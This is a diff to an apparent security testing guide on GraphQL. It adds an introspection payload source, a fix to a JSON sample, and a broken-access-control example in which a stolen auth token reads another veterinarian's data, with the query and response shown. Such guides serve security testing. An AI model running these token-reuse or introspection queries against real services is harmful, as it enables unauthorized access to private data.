@@ -34,7 +34,8 @@ There are a couple of ways to extract that and visualize the output:
 
 #### Using Native GraphQL Introspection
 
-The most straight-forward way is to send an HTTP request (using a proxy like Burp) with the following payload :
+The most straight-forward way is to send an HTTP request (using a proxy like Burp) with the following payload, taken from an article on [Medium](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696) :
+
 
 ```json
 query IntrospectionQuery {
@@ -211,8 +212,11 @@ Response:
             }
           ],
           "possibleTypes": null
-                ...
-        {
+        }
+      ]
+    }
+  }
+}
 ```
 
 Now use GraphQL Voyager to get a better look on the output:
@@ -234,11 +238,6 @@ GraphiQL is a web-based IDE for GraphQL. It is part of the GraphQL project, and 
 The best practice is to not allow users to access it on production deployments, however, if you are testing a staging environment you might have access to it and it can save you some time playing around with introspection queries (although you can, of course, use introspection in the GraphiQL interface).  
 
 The GraphiQL has a docs section, which uses the data from the scheme in order to created a documentation of the GraphQL instance that is being used.
-
-![GraphiQL1](images/GraphiQL1.png)
-![GraphiQL2](images/GraphiQL2.png)
-![GraphiQL3](images/GraphiQL3.png)
-![GraphiQL4](images/GraphiQL4.png)
 
 The documentation contains the data types, mutations, and basically every piece of information you can extract using Introspection.
 
@@ -264,14 +263,74 @@ Since GraphQL is usually bridges to the backend APIs of the system, its better t
 ### Authorization
 
 The first part, referring to introspection, is the first place to look for Authorization problems. As noted, introspection should be restricted since it allows for data extraction and data gathering.  
-The next thing you should check, once you have access to the scheme and know what sensitive information there is to extract, is sending queries which will not be blocked due to insufficient privileges.  
+The next thing you should check, once you have access to the scheme and know what sensitive information there is to extract, is sending queries which will not be blocked due to insufficient privileges. GraphQL does not enforce permissions by default, and so it is up to the application to perform these type of actions.  
 
 In the example GraphQL that is being used in this guide, the output of the introspection query, shows there is a query called auth, which seems like a good place to extract sensitive information (API tokens, passwords, etc').
 
 ![auth1](images/auth1.png)
 
 Testing the authorization implementation varies from deployment to deployment since each scheme will have different sensitive information's, and hence, different targets to focus on.  
-In this example, every user (even un-authenticated) can gain access to auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the scheme allows, such as associate or disassociate a dog from a specified veterinarian (using mutations).
+In this example, every user (even un-authenticated) can gain access to auth tokens of every veterinarian listed in the database. These tokens can be used to perform additional actions the scheme allows, such as associate or disassociate a dog from any specified veterinarian (using mutations), while there is no matching of the auth token to the veterinarian which appears in the request. An example would be, to use the token that was extracted (which belongs to Julien), and use it to perform an action as Benoit, which has the number 2 ID.
+
+```json
+query brokenAccessControl {
+  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
+    id, name, dogs {
+      name
+    }
+  }
+}
+```
+
+And the response:
+
+```json
+{
+  "data": {
+    "myInfo": {
+      "id": 2,
+      "name": "Benoit",
+      "dogs": [
+        {
+          "name": "Babou"
+        },
+        {
+          "name": "Baboune"
+        },
+        {
+          "name": "Babylon"
+        },
+        {
+          "name": "Banko"
+        },
+        {
+          "name": "Banzai"
+        },
+        {
+          "name": "Bao"
+        },
+        {
+          "name": "Barakouda"
+        },
+        {
+          "name": "Barba"
+        },
+        {
+          "name": "Barbara"
+        },
+        {
+          "name": "Bebe"
+        },
+        {
+          "name": "Becker"
+        }
+      ]
+    }
+  }
+}
+```
+
+All of the dogs in the list belong to Benoit and not to the veterinarian which sent the request (and owns the auth token).
 
 ### Injection
 
@@ -508,3 +567,4 @@ The remediation for these types of vulnerabilities is both input validation and 
 * [GraphQL Constraint Directive](https://github.com/confuser/graphql-constraint-directive)
 * [User side testing (XSS and other vulnerabilities)](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/11-Client-side_Testing)
 * [5 Common GraphQL Security Vulnerabilities](https://carvesystems.com/news/the-5-most-common-graphql-security-vulnerabilities/)
+* [GraphQL common vulnerabilities and how to exploit them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
